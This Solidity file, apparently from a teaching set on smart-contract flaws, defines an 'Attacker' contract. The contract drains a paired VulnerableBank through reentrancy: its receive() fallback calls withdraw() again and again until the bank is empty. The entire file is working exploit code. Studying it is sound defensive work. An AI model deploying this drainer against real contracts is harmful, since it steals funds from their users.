// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SC05_Reentrancy_Victim.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint public attackCount;

    constructor(address payable _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    receive() external payable {
        if (address(vulnerableBank).balance > 0) {
            vulnerableBank.withdraw();
        }
    }

    function attack() public payable {
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
